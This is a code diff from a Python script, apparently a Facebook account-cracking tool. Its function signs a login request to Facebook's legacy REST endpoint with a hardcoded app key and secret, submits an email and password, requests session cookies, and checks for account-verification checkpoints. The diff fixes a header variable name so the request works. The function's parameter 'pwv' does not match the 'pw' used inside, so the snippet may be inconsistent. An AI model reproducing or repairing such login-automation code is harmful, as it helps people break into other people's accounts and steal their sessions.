@@ -1775,7 +1775,7 @@ def fanky_api(idf, pwv):
             data = {'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d', 'email': idf, 'password': pw, 'credentials_type': 'password', 'generate_session_cookies': '1', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'device_id': '1234567890abcdef', 'cpl': 'true', 'try_num': '1', 'family_device_id': '1234567890abcdef', 'login_latitude': '0.0', 'login_longitude': '0.0', 'login_location_accuracy_m': '1.0', 'generate_machine_id': '1', 'generate_analytics_claim': '1', 'meta_inf_fbmeta': ''}
             api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
             data['sig'] = hashlib.md5((''.join(f'{k}={data[k]}' for k in sorted(data)) + api_secret).encode()).hexdigest()
-            head = {'User-Agent': ua, 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate'}
+            headers = {'User-Agent': ua, 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'ef0e330bff1cd312f36aa5f2c69c59a9', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate'}
             fan = ses.post('https://api.facebook.com/restserver.php', data=data, headers=headers, verify=True)
             result = fan.json()
             if "error_msg" in result and "User must verify their account" in result["error_msg"]:
